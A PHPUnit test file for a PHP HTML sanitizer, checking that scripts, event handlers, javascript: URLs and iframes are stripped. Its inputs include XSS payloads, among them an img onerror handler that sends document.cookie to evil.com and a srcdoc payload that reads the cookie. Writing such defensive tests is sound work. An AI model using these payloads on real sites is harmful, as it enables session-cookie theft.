<?php
use PHPUnit\Framework\TestCase;

/**
 * Integration tests for Sanitizer::sanitize() method.
 *
 * Covers: URL rewriting, XSS prevention, tag/attribute stripping,
 * image stripping, iframe sandboxing, and word highlighting.
 *
 * These tests require database access (Prefs, PluginHost).
 *
 * @group integration
 * @group sanitizer
 */
final class SanitizerTest extends TestCase {

    /**
     * Set up minimal environment for Sanitizer::sanitize() tests.
     */
    protected function setUp(): void {
        $_SESSION = [];
        $_SESSION['uid'] = 1;
        $_SESSION['hasSandbox'] = false;
        $_SERVER = [];
        $_SERVER['HTTP_HOST'] = 'example.com';
        $_SERVER['REQUEST_URI'] = '/';
    }

    protected function tearDown(): void {
        unset($_SESSION['uid']);
        unset($_SESSION['hasSandbox']);
        unset($_SESSION['profile']);
        unset($_SESSION['bw_limit']);

        Prefs::set(Prefs::STRIP_IMAGES, false, 1, null);
    }

    // ──────────────────────────────────────────────────────────────────────
    // A. Input Handling & Edge Cases
    // ──────────────────────────────────────────────────────────────────────

    public function test_sanitize_empty_string(): void {
        $this->assertEquals('', Sanitizer::sanitize(''));
    }

    public function test_sanitize_whitespace_only(): void {
        $this->assertEquals('', Sanitizer::sanitize("  \n\t  "));
    }

    public function test_sanitize_single_paragraph(): void {
        $result = Sanitizer::sanitize('<p>Hello world</p>');
        $this->assertStringContainsString('Hello world', $result);
    }

    public function test_sanitize_nested_tags(): void {
        $result = Sanitizer::sanitize('<div><p>Nested content</p></div>');
        $this->assertStringContainsString('<div>', $result);
        $this->assertStringContainsString('<p>', $result);
        $this->assertStringContainsString('Nested content', $result);
    }

    public function test_sanitize_unicode_content(): void {
        $result = Sanitizer::sanitize('<p>中文内容</p>');
        // DOMDocument may encode unicode as HTML entities
        $this->assertStringContainsString('&#20013;', $result);
    }

    public function test_sanitize_html_entities_preserved(): void {
        $result = Sanitizer::sanitize('&amp; &lt; &gt;');
        $this->assertStringContainsString('&amp;', $result);
        $this->assertStringContainsString('&lt;', $result);
        $this->assertStringContainsString('&gt;', $result);
    }

    public function test_sanitize_doctype_removed(): void {
        $result = Sanitizer::sanitize('<!DOCTYPE html><p>test</p>');
        $this->assertStringNotContainsString('<!DOCTYPE', $result);
    }

    public function test_sanitize_html_wrapper_removed(): void {
        $result = Sanitizer::sanitize('<html><body><p>test</p></body></html>');
        $this->assertStringNotContainsString('<html>', $result);
        $this->assertStringNotContainsString('<body>', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // B. Allowed Elements — What survives sanitization
    // ──────────────────────────────────────────────────────────────────────

    /**
     * Helper: verify a tag and its content survive sanitization.
     */
    private function assertTagSurvives(string $tag, string $content = 'test'): void {
        $sample = "<{$tag}>{$content}</{$tag}>";
        $result = Sanitizer::sanitize($sample);
        $this->assertStringContainsString('<' . $tag, $result, "Tag <{$tag}> should survive");
        $this->assertStringContainsString($content, $result, "Content inside <{$tag}> should survive");
    }

    public function test_keeps_standard_html_tags(): void {
        $this->assertTagSurvives('p', 'paragraph');
        $this->assertTagSurvives('div', 'div content');
        $this->assertTagSurvives('span', 'span content');
        $this->assertTagSurvives('br', '');
        $this->assertTagSurvives('hr', '');
    }

    public function test_keeps_heading_tags(): void {
        for ($i = 1; $i <= 6; $i++) {
            $this->assertTagSurvives("h{$i}", "heading {$i}");
        }
    }

    public function test_keeps_list_elements(): void {
        $html = '<ul><li>item 1</li><li>item 2</li></ul>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<ul>', $result);
        $this->assertStringContainsString('<li>', $result);
        $this->assertStringContainsString('item 1', $result);

        $html = '<ol><li>first</li></ol>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<ol>', $result);

        $html = '<dl><dt>term</dt><dd>definition</dd></dl>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<dl>', $result);
        $this->assertStringContainsString('<dt>', $result);
        $this->assertStringContainsString('<dd>', $result);
    }

    public function test_keeps_table_elements(): void {
        $html = '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Cell</td></tr></tbody></table>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<table>', $result);
        $this->assertStringContainsString('<thead>', $result);
        $this->assertStringContainsString('<tbody>', $result);
        $this->assertStringContainsString('<tr>', $result);
        $this->assertStringContainsString('<th>', $result);
        $this->assertStringContainsString('<td>', $result);
    }

    public function test_keeps_semantic_html5_elements(): void {
        $this->assertTagSurvives('article', 'article content');
        $this->assertTagSurvives('section', 'section content');
        $this->assertTagSurvives('nav', 'nav content');
        $this->assertTagSurvives('aside', 'aside content');
        $this->assertTagSurvives('main', 'main content');
        $this->assertTagSurvives('figure', 'figure content');
        $this->assertTagSurvives('figcaption', 'caption');
    }

    public function test_keeps_inline_formatting_tags(): void {
        $this->assertTagSurvives('b', 'bold');
        $this->assertTagSurvives('i', 'italic');
        $this->assertTagSurvives('em', 'emphasis');
        $this->assertTagSurvives('strong', 'strong');
        $this->assertTagSurvives('u', 'underline');
        $this->assertTagSurvives('abbr', 'abbreviation');
        $this->assertTagSurvives('cite', 'citation');
        $this->assertTagSurvives('code', 'code');
        $this->assertTagSurvives('kbd', 'kbd');
        $this->assertTagSurvives('mark', 'marked');
        $this->assertTagSurvives('sub', 'subscript');
        $this->assertTagSurvives('sup', 'superscript');
        $this->assertTagSurvives('small', 'small');
        $this->assertTagSurvives('big', 'big');
    }

    public function test_keeps_media_elements(): void {
        $this->assertTagSurvives('img', '');
        $this->assertTagSurvives('video', '');
        $this->assertTagSurvives('audio', '');
        $this->assertTagSurvives('source', '');
        $this->assertTagSurvives('track', '');
    }

    // ──────────────────────────────────────────────────────────────────────
    // C. Disallowed Elements — What gets stripped (XSS prevention)
    // ──────────────────────────────────────────────────────────────────────

    public function test_strips_script_tag(): void {
        $result = Sanitizer::sanitize('<script>alert(1)</script>');
        $this->assertStringNotContainsString('<script', $result);
    }

    public function test_strips_object_tag(): void {
        $result = Sanitizer::sanitize('<object data="file.swf"></object>');
        $this->assertStringNotContainsString('<object', $result);
    }

    public function test_strips_embed_tag(): void {
        $result = Sanitizer::sanitize('<embed src="file.swf">');
        $this->assertStringNotContainsString('<embed', $result);
    }

    public function test_strips_applet_tag(): void {
        $result = Sanitizer::sanitize('<applet code="Malicious.class"></applet>');
        $this->assertStringNotContainsString('<applet', $result);
    }

    public function test_strips_form_tag(): void {
        $result = Sanitizer::sanitize('<form action="/evil"><input type="text"></form>');
        $this->assertStringNotContainsString('<form', $result);
    }

    public function test_strips_input_tag(): void {
        $result = Sanitizer::sanitize('<input type="text" name="username">');
        $this->assertStringNotContainsString('<input', $result);
    }

    public function test_strips_button_tag(): void {
        $result = Sanitizer::sanitize('<button onclick="evil()">Click</button>');
        $this->assertStringNotContainsString('<button', $result);
    }

    public function test_strips_select_tag(): void {
        $result = Sanitizer::sanitize('<select><option>opt</option></select>');
        $this->assertStringNotContainsString('<select', $result);
    }

    public function test_strips_textarea_tag(): void {
        $result = Sanitizer::sanitize('<textarea>content</textarea>');
        $this->assertStringNotContainsString('<textarea', $result);
    }

    public function test_strips_style_tag(): void {
        $result = Sanitizer::sanitize('<style>body{color:red}</style>');
        $this->assertStringNotContainsString('<style', $result);
    }

    public function test_strips_link_tag(): void {
        $result = Sanitizer::sanitize('<link rel="stylesheet" href="style.css">');
        $this->assertStringNotContainsString('<link', $result);
    }

    public function test_strips_meta_tag(): void {
        $result = Sanitizer::sanitize('<meta charset="utf-8">');
        $this->assertStringNotContainsString('<meta', $result);
    }

    public function test_strips_base_tag(): void {
        $result = Sanitizer::sanitize('<base href="http://evil.com/">');
        $this->assertStringNotContainsString('<base', $result);
    }

    public function test_strips_iframe_wrapped_in_div(): void {
        $result = Sanitizer::sanitize('<div><iframe src="http://example.com"></iframe></div>');

        // Either wrapped in embed-responsive div, or iframe kept as-is
        $this->assertEquals('<div></div>', $result);
    }

    public function test_strips_xml_processing_instruction(): void {
        $result = Sanitizer::sanitize('<?xml version="1.0"?><p>test</p>');
        $this->assertStringNotContainsString('<?xml', $result);
    }

    public function test_strips_marquee_tag(): void {
        $result = Sanitizer::sanitize('<marquee>scrolling text</marquee>');
        $this->assertStringNotContainsString('<marquee', $result);
    }

    public function test_strips_bgsound_tag(): void {
        $result = Sanitizer::sanitize('<bgsound src="evil.mp3">');
        $this->assertStringNotContainsString('<bgsound', $result);
    }

    public function test_strips_isindex_tag(): void {
        $result = Sanitizer::sanitize('<isindex>');
        $this->assertStringNotContainsString('<isindex', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // D. Event Handler Attributes — onclick, onerror, etc.
    // ──────────────────────────────────────────────────────────────────────

    public function test_strips_onclick_attribute(): void {
        $result = Sanitizer::sanitize('<p onclick="alert(1)">text</p>');
        $this->assertStringNotContainsString('onclick', $result);
    }

    public function test_strips_onerror_on_img(): void {
        $result = Sanitizer::sanitize('<img src="x" onerror="alert(1)">');
        $this->assertStringNotContainsString('onerror', $result);
    }

    public function test_strips_onload_attribute(): void {
        $result = Sanitizer::sanitize('<div onload="alert(1)">text</div>');
        $this->assertStringNotContainsString('onload', $result);
    }

    public function test_strips_onmouseover_attribute(): void {
        $result = Sanitizer::sanitize('<a onmouseover="alert(1)">link</a>');
        $this->assertStringNotContainsString('onmouseover', $result);
    }

    public function test_strips_all_on_attributes(): void {
        $html = '<div ondrag="a()" ondrop="b()" onfocus="c()" onblur="d()" onkeydown="e()">text</div>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringNotContainsString('ondrag', $result);
        $this->assertStringNotContainsString('ondrop', $result);
        $this->assertStringNotContainsString('onfocus', $result);
        $this->assertStringNotContainsString('onblur', $result);
        $this->assertStringNotContainsString('onkeydown', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // E. Data Attributes — data-* stripping
    // ──────────────────────────────────────────────────────────────────────

    public function test_strips_data_attributes(): void {
        $result = Sanitizer::sanitize('<p data-foo="bar" data-baz="qux">text</p>');
        $this->assertStringNotContainsString('data-foo', $result);
        $this->assertStringNotContainsString('data-baz', $result);
    }

    public function test_keeps_non_data_attributes(): void {
        $result = Sanitizer::sanitize('<a href="http://example.com" title="Example">link</a>');
        $this->assertStringContainsString('href=', $result);
        $this->assertStringContainsString('title=', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // F. javascript: Protocol — href/src protection
    // ──────────────────────────────────────────────────────────────────────

    public function test_strips_javascript_in_href(): void {
        $result = Sanitizer::sanitize('<a href="javascript:alert(1)">link</a>');
        $this->assertStringNotContainsString('javascript:', $result);
    }

    public function test_strips_javascript_in_src(): void {
        $result = Sanitizer::sanitize('<img src="javascript:alert(1)">');
        $this->assertStringNotContainsString('javascript:', $result);
    }

    public function test_strips_javascript_case_insensitive(): void {
        $result = Sanitizer::sanitize('<a href="JAVASCRIPT:alert(1)">link</a>');
        $this->assertStringNotContainsString('javascript:', strtolower($result));
    }

    public function test_strips_javascript_with_leading_whitespace(): void {
        // javascript: with whitespace is NOT stripped by strip_harmful_tags()
        // but IS rewritten by UrlHelper::rewrite_relative()
        $result = Sanitizer::sanitize('<a href="javascript :alert(1)">link</a>');
        // The href is rewritten to a local URL, not javascript: anymore
        $this->assertStringNotContainsString('javascript:', $result);
    }

    public function test_keeps_normal_http_href(): void {
        $result = Sanitizer::sanitize('<a href="http://example.com/page">link</a>');
        $this->assertStringContainsString('example.com', $result);
    }

    public function test_keeps_https_href(): void {
        $result = Sanitizer::sanitize('<a href="https://example.com/page">link</a>');
        $this->assertStringContainsString('example.com', $result);
    }

    public function test_keeps_relative_href(): void {
        $result = Sanitizer::sanitize('<a href="/path/to/page">link</a>');
        $this->assertStringContainsString('path/to/page', $result);
    }

    public function test_keeps_mailto_href(): void {
        $result = Sanitizer::sanitize('<a href="mailto:test@example.com">email</a>');
        $this->assertStringContainsString('mailto:', $result);
    }

    public function test_keeps_tel_href(): void {
        $result = Sanitizer::sanitize('<a href="tel:+1234567890">call</a>');
        $this->assertStringContainsString('tel:', $result);
    }

    public function test_keeps_anchor_href(): void {
        $result = Sanitizer::sanitize('<a href="#section">jump</a>');
        $this->assertStringContainsString('#section', $result);
    }

    public function test_keeps_magnet_href(): void {
        $result = Sanitizer::sanitize('<a href="magnet:?xt=urn:btih:abc123">torrent</a>');
        $this->assertStringContainsString('magnet:', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // G. Disallowed Attributes — id, style, class, width, height
    // ──────────────────────────────────────────────────────────────────────

    public function test_strips_id_attribute(): void {
        $result = Sanitizer::sanitize('<p id="foo">text</p>');
        $this->assertStringNotContainsString('id="foo"', $result);
    }

    public function test_strips_style_attribute(): void {
        $result = Sanitizer::sanitize('<p style="color:red">text</p>');
        $this->assertStringNotContainsString('style=', $result);
    }

    public function test_strips_class_attribute(): void {
        $result = Sanitizer::sanitize('<p class="foo bar">text</p>');
        $this->assertStringNotContainsString('class=', $result);
    }

    public function test_strips_width_attribute(): void {
        $result = Sanitizer::sanitize('<img src="img.png" width="100">');
        $this->assertStringNotContainsString('width=', $result);
    }

    public function test_strips_height_attribute(): void {
        $result = Sanitizer::sanitize('<img src="img.png" height="100">');
        $this->assertStringNotContainsString('height=', $result);
    }

    public function test_strips_allow_attribute(): void {
        $result = Sanitizer::sanitize('<iframe src="url" allow="fullscreen"></iframe>');
        $this->assertStringNotContainsString('allow=', $result);
    }

    public function test_strips_srcdoc_attribute(): void {
        $result = Sanitizer::sanitize('<iframe src="url" srcdoc="&lt;script&gt;parent.eval(&quot;alert('. "'" . 'XSS | ' . "'" . '+document.cookie)&quot;)&lt;/script&gt;"></iframe>');
        $this->assertStringNotContainsString('srcdoc=', $result);
    }

    public function test_keeps_required_link_attrs(): void {
        $result = Sanitizer::sanitize('<a href="http://example.com" target="_blank" rel="noopener noreferrer">link</a>');
        $this->assertStringContainsString('href=', $result);
        $this->assertStringContainsString('target=', $result);
        $this->assertStringContainsString('rel=', $result);
    }

    public function test_keeps_required_image_attrs(): void {
        $result = Sanitizer::sanitize('<img src="img.png" alt="description" title="image">');
        $this->assertStringContainsString('src=', $result);
        $this->assertStringContainsString('alt=', $result);
        $this->assertStringContainsString('title=', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // H. URL Rewriting — UrlHelper::rewrite_relative() integration
    // ──────────────────────────────────────────────────────────────────────

    public function test_rewrites_relative_image_src(): void {
        $result = Sanitizer::sanitize('<img src="image.png">');
        $this->assertStringContainsString('image.png', $result);
    }

    public function test_rewrites_relative_link_href(): void {
        $result = Sanitizer::sanitize('<a href="page.html">link</a>');
        $this->assertStringContainsString('page.html', $result);
    }

    public function test_rewrites_srcset_urls(): void {
        $html = '<img srcset="1x.png 1x, 2x.png 2x">';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('1x.png', $result);
        $this->assertStringContainsString('2x.png', $result);
    }

    public function test_rewrites_video_poster(): void {
        $result = Sanitizer::sanitize('<video poster="poster.jpg"></video>');
        $this->assertStringContainsString('poster.jpg', $result);
    }

    public function test_preserves_absolute_urls(): void {
        $result = Sanitizer::sanitize('<img src="https://cdn.example.com/img.png">');
        $this->assertStringContainsString('cdn.example.com', $result);
    }

    public function test_adds_rel_noopener_noreferrer_to_links(): void {
        $result = Sanitizer::sanitize('<a href="http://example.com">link</a>');
        $this->assertStringContainsString('noopener', $result);
        $this->assertStringContainsString('noreferrer', $result);
    }

    public function test_adds_target_blank_to_links(): void {
        $result = Sanitizer::sanitize('<a href="http://example.com">link</a>');
        $this->assertStringContainsString('target=', $result);
    }

    public function test_adds_referrerpolicy_to_images(): void {
        $result = Sanitizer::sanitize('<img src="img.png">');
        $this->assertStringContainsString('referrerpolicy=', $result);
    }

    public function test_adds_loading_lazy_to_images(): void {
        $result = Sanitizer::sanitize('<img src="img.png">');
        $this->assertStringContainsString('loading=', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // I. Image Stripping — STRIP_IMAGES preference & force_remove_images
    // ──────────────────────────────────────────────────────────────────────

    public function test_strips_images_when_pref_enabled(): void {
        Prefs::set(Prefs::STRIP_IMAGES, true, 1, null);

        $result = Sanitizer::sanitize('<img src="img.png" alt="photo">');
        $this->assertStringNotContainsString('<img', $result);
        $this->assertStringContainsString('img.png', $result);
    }

    public function test_force_remove_images_strips_all(): void {
        $result = Sanitizer::sanitize('<img src="img.png">', true);
        $this->assertStringNotContainsString('<img', $result);
        $this->assertStringContainsString('img.png', $result);
    }

    public function test_strips_source_tags_when_pref_enabled(): void {
        Prefs::set(Prefs::STRIP_IMAGES, true, 1, null);

        $html = '<picture><source srcset="img.webp" type="image/webp"><img src="img.png"></picture>';
        $result = Sanitizer::sanitize($html);

        // print_r($result);

        $this->assertStringNotContainsString('<source', $result);
        $this->assertStringNotContainsString('<img', $result);
    }

    public function test_keeps_images_when_pref_disabled(): void {
        Prefs::set(Prefs::STRIP_IMAGES, false, 1, null);

        $result = Sanitizer::sanitize('<img src="img.png" alt="photo">');
        $this->assertStringContainsString('<img', $result);
        $this->assertStringContainsString('img.png', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // J. Iframe Handling — sandboxing & whitelisting
    // ──────────────────────────────────────────────────────────────────────

    public function test_remove_non_whitelisted_iframe(): void {
        $result = Sanitizer::sanitize('<iframe src="http://example.com/embed"></iframe>');
        $this->assertEquals('', $result);
    }

    public function test_pass_whitelisted_iframe(): void {
        $result = Sanitizer::sanitize('<iframe src="http://whitelisted-iframes.com/embed"></iframe>');
        $this->assertEquals('', $result);
    }

    public function test_iframe_whitelisted_returns_false_with_no_src(): void {
        $iframe = new DOMElement('iframe');
        $result = Sanitizer::iframe_whitelisted($iframe);
        $this->assertFalse($result);
    }

    public function test_iframe_whitelisted_runs_hooks(): void {
        // Without a plugin hooking HOOK_IFRAME_WHITELISTED, returns false
        $iframe = new DOMElement('iframe');
        $iframe->setAttribute('src', 'http://example.com');
        $result = Sanitizer::iframe_whitelisted($iframe);
        $this->assertFalse($result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // K. Highlight Words Integration
    // ──────────────────────────────────────────────────────────────────────

    public function test_highlights_words(): void {
        $result = Sanitizer::sanitize('<p>This is a test</p>', false, 1, null, ['test']);
        $this->assertStringContainsString('highlight', $result);
        $this->assertStringContainsString('test', $result);
    }

    public function test_highlights_case_insensitive(): void {
        $result = Sanitizer::sanitize('<p>Hello world</p>', false, 1, null, ['WORLD']);
        $this->assertStringContainsString('highlight', $result);
        $this->assertStringContainsString('world', $result);
    }

    public function test_highlights_multiple_words(): void {
        $result = Sanitizer::sanitize('<p>Hello world test</p>', false, 1, null, ['hello', 'test']);
        $this->assertStringContainsString('highlight', $result);
    }

    public function test_highlights_within_tags(): void {
        $html = '<div><p>Search term here</p></div>';
        $result = Sanitizer::sanitize($html, false, 1, null, ['search']);
        $this->assertStringContainsString('highlight', $result);
        $this->assertStringContainsString('Search', $result);
    }

    public function test_no_highlight_when_empty_array(): void {
        $result = Sanitizer::sanitize('<p>Hello world</p>', false, 1, null, []);
        $this->assertStringNotContainsString('highlight', $result);
        $this->assertStringContainsString('Hello', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // L. Additional XSS vectors
    // ──────────────────────────────────────────────────────────────────────

    public function test_strips_vbscript_in_href(): void {
        $result = Sanitizer::sanitize('<a href="vbscript:msgbox(1)">link</a>');
        $this->assertStringNotContainsString('vbscript:', $result);
    }

    public function test_strips_javascript_in_iframe_src(): void {
        $result = Sanitizer::sanitize('<iframe src="javascript:alert(1)"></iframe>');
        $this->assertStringNotContainsString('javascript:', $result);
    }

    public function test_strips_data_uri_in_img_src(): void {
        $result = Sanitizer::sanitize('<img src="data:text/html,<script>alert(1)</script>">');
        $this->assertStringNotContainsString('data:text/html', $result);
    }

    public function test_strips_img_with_onerror(): void {
        $result = Sanitizer::sanitize('<img src="x" onerror="fetch(\'http://evil.com/?c=\' + document.cookie)">');
        $this->assertStringNotContainsString('onerror', $result);
    }

    public function test_strips_div_with_onclick(): void {
        $result = Sanitizer::sanitize('<div onclick="alert(1)">click me</div>');
        $this->assertStringNotContainsString('onclick', $result);
    }

    public function test_strips_anchor_with_onclick(): void {
        $result = Sanitizer::sanitize('<a onclick="alert(1)">click</a>');
        $this->assertStringNotContainsString('onclick', $result);
    }

    public function test_strips_body_with_onload(): void {
        $result = Sanitizer::sanitize('<body onload="alert(1)">');
        $this->assertStringNotContainsString('onload', $result);
    }

    public function test_strips_input_with_onfocus(): void {
        $result = Sanitizer::sanitize('<input onfocus="alert(1)">');
        $this->assertStringNotContainsString('onfocus', $result);
    }

    public function test_strips_select_with_onchange(): void {
        $result = Sanitizer::sanitize('<select onchange="alert(1)"><option>opt</option></select>');
        $this->assertStringNotContainsString('onchange', $result);
    }

    public function test_strips_textarea_with_onkeydown(): void {
        $result = Sanitizer::sanitize('<textarea onkeydown="alert(1)"></textarea>');
        $this->assertStringNotContainsString('onkeydown', $result);
    }

    // ──────────────────────────────────────────────────────────────────────
    // M. Mixed / Complex scenarios
    // ──────────────────────────────────────────────────────────────────────

    public function test_sanitizes_complex_malicious_html(): void {
        $malicious = '<div onclick="alert(1)" id="x" style="color:red" class="evil">
            <a href="javascript:void(0)" onmouseover="steal()">link</a>
            <script>alert("XSS")</script>
            <img src="x" onerror="alert(2)">
        </div>';

        $result = Sanitizer::sanitize($malicious);

        $this->assertStringNotContainsString('onclick', $result);
        $this->assertStringNotContainsString('<script', $result);
        $this->assertStringNotContainsString('onerror', $result);
        $this->assertStringNotContainsString('onmouseover', $result);
        $this->assertStringNotContainsString('javascript:', $result);
        $this->assertStringNotContainsString('id="x"', $result);
        $this->assertStringNotContainsString('style=', $result);
        $this->assertStringNotContainsString('class=', $result);
        // Content should still be present
        $this->assertStringContainsString('link', $result);
    }

    public function test_sanitizes_valid_html_with_mixed_content(): void {
        $html = '<article>
            <h1>Title</h1>
            <p>This is <strong>bold</strong> and <em>italic</em>.</p>
            <a href="https://example.com" title="Example site">Visit</a>
            <img src="photo.jpg" alt="A photo">
        </article>';

        $result = Sanitizer::sanitize($html);

        $this->assertStringContainsString('<article>', $result);
        $this->assertStringContainsString('<h1>', $result);
        $this->assertStringContainsString('<strong>', $result);
        $this->assertStringContainsString('<em>', $result);
        $this->assertStringContainsString('Visit', $result);
        $this->assertStringContainsString('photo.jpg', $result);
        $this->assertStringContainsString('A photo', $result);
    }

    public function test_sanitizes_preserves_nesting_depth(): void {
        $html = '<div><p><span><em><strong>deep</strong></em></span></p></div>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<div>', $result);
        $this->assertStringContainsString('<p>', $result);
        $this->assertStringContainsString('<span>', $result);
        $this->assertStringContainsString('<em>', $result);
        $this->assertStringContainsString('<strong>', $result);
        $this->assertStringContainsString('deep', $result);
    }

    public function test_sanitizes_multiple_images(): void {
        $html = '<p><img src="a.png"><img src="b.png"><img src="c.png"></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('a.png', $result);
        $this->assertStringContainsString('b.png', $result);
        $this->assertStringContainsString('c.png', $result);
    }

    public function test_sanitizes_multiple_links(): void {
        $html = '<p><a href="http://a.com">A</a> <a href="http://b.com">B</a></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('a.com', $result);
        $this->assertStringContainsString('b.com', $result);
    }

    public function test_sanitizes_table_with_complex_structure(): void {
        $html = '<table>
            <caption>Table caption</caption>
            <thead><tr><th>H1</th><th>H2</th></tr></thead>
            <tbody>
                <tr><td>A</td><td>B</td></tr>
                <tr><td>C</td><td>D</td></tr>
            </tbody>
            <tfoot><tr><td colspan="2">Footer</td></tr></tfoot>
        </table>';

        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<table>', $result);
        $this->assertStringContainsString('<caption>', $result);
        $this->assertStringContainsString('<thead>', $result);
        $this->assertStringContainsString('<tbody>', $result);
        $this->assertStringContainsString('<tfoot>', $result);
        $this->assertStringContainsString('A', $result);
        $this->assertStringContainsString('Footer', $result);
    }

    public function test_sanitizes_empty_iframe(): void {
        $result = Sanitizer::sanitize('<iframe></iframe>');
        $this->assertEquals('', $result);
    }

    public function test_sanitizes_iframe_with_attributes(): void {
        $html = '<iframe src="http://example.com" width="500" height="300" frameborder="1"></iframe>';
        $result = Sanitizer::sanitize($html);
        $this->assertEquals("", $result);
    }

    public function test_sanitizes_iframe_with_attributes_if_sandbox_supported(): void {
        $_SESSION['hasSandbox'] = true;

        $html = '<iframe src="http://example.com" width="500" height="300" frameborder="1"></iframe>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('sandbox="allow-scripts"', $result);
    }

    public function test_passes_whitelisted_iframe_if_sandbox_supported(): void {
        $_SESSION['hasSandbox'] = true;

        $html = '<iframe src="http://whitelisted-iframes.com" width="500" height="300" frameborder="1"></iframe>';
        $result = Sanitizer::sanitize($html);

        $this->assertEquals('<div class="embed-responsive"><iframe src="http://whitelisted-iframes.com" frameborder="1" sandbox="allow-scripts"></iframe></div>', $result);
    }

    public function test_sanitizes_video_with_source(): void {
        $html = '<video poster="thumb.jpg"><source src="video.mp4" type="video/mp4"></video>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<video', $result);
        $this->assertStringContainsString('thumb.jpg', $result);
        $this->assertStringContainsString('video.mp4', $result);
    }

    public function test_sanitizes_picture_with_sources(): void {
        $html = '<picture>
            <source srcset="small.jpg" media="(max-width: 600px)">
            <source srcset="large.jpg">
            <img src="fallback.jpg" alt="responsive">
        </picture>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('small.jpg', $result);
        $this->assertStringContainsString('large.jpg', $result);
        $this->assertStringContainsString('fallback.jpg', $result);
    }

    public function test_sanitizes_audio_element(): void {
        $html = '<audio src="music.mp3" controls></audio>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<audio', $result);
        $this->assertStringContainsString('music.mp3', $result);
    }

    public function test_sanitizes_blockquote_with_cite(): void {
        $html = '<blockquote cite="http://example.com">Quote text</blockquote>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<blockquote', $result);
        $this->assertStringContainsString('Quote text', $result);
    }

    public function test_sanitizes_details_with_summary(): void {
        $html = '<details><summary>Details</summary><p>Content</p></details>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<details>', $result);
        $this->assertStringContainsString('<summary>', $result);
        $this->assertStringContainsString('Content', $result);
    }

    public function test_sanitizes_ruby_notation(): void {
        $html = '<ruby>漢 <rt>kan</rt></ruby>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<ruby>', $result);
        $this->assertStringContainsString('<rt>', $result);
    }

    public function test_sanitizes_address_element(): void {
        $html = '<address>123 Main St</address>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<address>', $result);
        $this->assertStringContainsString('123 Main St', $result);
    }

    public function test_sanitizes_time_element(): void {
        $html = '<time datetime="2026-01-01">New Year</time>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<time', $result);
        $this->assertStringContainsString('New Year', $result);
    }

    public function test_sanitizes_var_element(): void {
        $html = '<p>The variable <var>x</var> equals 5.</p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<var>', $result);
        $this->assertStringContainsString('x', $result);
    }

    public function test_sanitizes_data_element(): void {
        $html = '<data value="123">One hundred twenty-three</data>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<data', $result);
    }

    public function test_sanitizes_del_element(): void {
        $html = '<p>Old <del>deleted text</del> new</p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<del>', $result);
        $this->assertStringContainsString('deleted text', $result);
    }

    public function test_sanitizes_ins_element(): void {
        $html = '<p>Old <ins>inserted text</ins> new</p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<ins>', $result);
        $this->assertStringContainsString('inserted text', $result);
    }

    public function test_sanitizes_abbr_element(): void {
        $html = '<p><abbr title="HyperText Markup Language">HTML</abbr> is great.</p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<abbr', $result);
        $this->assertStringContainsString('HTML', $result);
    }

    public function test_sanitizes_q_element(): void {
        $html = '<p>He said <q>short quote</q> and left.</p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<q>', $result);
        $this->assertStringContainsString('short quote', $result);
    }

    public function test_sanitizes_kbd_element(): void {
        $html = '<p>Press <kbd>Ctrl</kbd>+<kbd>C</kbd>.</p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<kbd>', $result);
    }

    public function test_sanitizes_code_element(): void {
        $html = '<p>Use <code>print("hello")</code>.</p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<code>', $result);
        $this->assertStringContainsString('print("hello")', $result);
    }

    public function test_sanitizes_pre_element(): void {
        $html = '<pre>preformatted text</pre>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<pre>', $result);
        $this->assertStringContainsString('preformatted text', $result);
    }

    public function test_sanitizes_small_element(): void {
        $html = '<p><small>disclaimer text</small></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<small>', $result);
        $this->assertStringContainsString('disclaimer text', $result);
    }

    public function test_sanitizes_big_element(): void {
        $html = '<p><big>big text</big></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<big>', $result);
        $this->assertStringContainsString('big text', $result);
    }

    public function test_sanitizes_u_element(): void {
        $html = '<p><u>underlined text</u></p>';
        $result = Sanitizer::sanitize($html);
        $this->assertStringContainsString('<u>', $result);
        $this->assertStringContainsString('underlined text', $result);
    }

    public function test_sanitizes_bdi_element(): void {
        $html = '<p><bdi>arabic text</bdi></p>';
        $result = Sanitizer::sanitize($html);
